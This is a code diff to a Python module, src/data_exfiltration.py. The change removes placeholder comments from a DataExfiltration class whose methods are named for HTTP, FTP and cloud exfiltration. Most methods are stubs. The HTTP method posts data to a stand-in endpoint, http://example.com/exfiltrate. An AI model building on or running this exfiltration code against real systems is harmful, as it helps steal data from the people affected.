+++ src/data_exfiltration.py
@@ -19,18 +19,15 @@ class DataExfiltration:
 
     def http_exfiltration(self, data):
         logging.info("Exfiltrating data via HTTP...")
-        # Placeholder for HTTP exfiltration logic
         response = requests.post("http://example.com/exfiltrate", data=data)
         return response.status_code
 
     def ftp_exfiltration(self, data):
         logging.info("Exfiltrating data via FTP...")
-        # Placeholder for FTP exfiltration logic
         return "FTP exfiltration executed."
 
     def cloud_exfiltration(self, data):
         logging.info("Exfiltrating data to cloud storage...")
-        # Placeholder for cloud exfiltration logic
         return "Cloud exfiltration executed."
 
     def render(self):
@@ -38,7 +35,6 @@ class DataExfiltration:
 
     def integrate_with_new_components(self, new_component_data):
         logging.info("Integrating with new components")
-        # Placeholder for integration logic with new components
         integrated_data = {
             "new_component_http_data": new_component_data.get("http_data", {}),
             "new_component_ftp_data": new_component_data.get("ftp_data", {}),
@@ -48,7 +44,6 @@ class DataExfiltration:
 
     def ensure_compatibility(self, existing_data, new_component_data):
         logging.info("Ensuring compatibility with existing data exfiltration logic")
-        # Placeholder for compatibility logic
         compatible_data = {
             "existing_http_data": existing_data.get("http_data", {}),
             "existing_ftp_data": existing_data.get("ftp_data", {}),
